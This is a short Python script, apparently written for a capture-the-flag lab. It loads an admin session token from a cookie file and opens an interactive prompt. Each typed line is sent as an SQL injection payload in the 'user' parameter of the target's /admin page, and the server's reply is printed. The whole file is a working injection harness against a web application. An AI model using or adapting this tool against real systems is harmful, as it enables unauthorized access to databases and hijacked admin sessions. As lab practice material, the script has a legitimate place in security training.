import readline
import requests as rq

url = 'http://10.10.243.85'

s = rq.Session()

def sqli(s, cookie, cmd):
	res = s.get(url+f'/admin?user={cmd}', cookies=cookie)
	print(res.text)


# Get cookie frmo ./admin.cookie
with open('admin.cookie', 'r') as f:
	cookie = f.read()
cookie = cookie[cookie.find('token='):cookie.find(';')].split('=')
cookie = {cookie[0]: cookie[1]}

while True:
	cmd = input('> ')
	sqli(s, cookie, cmd)
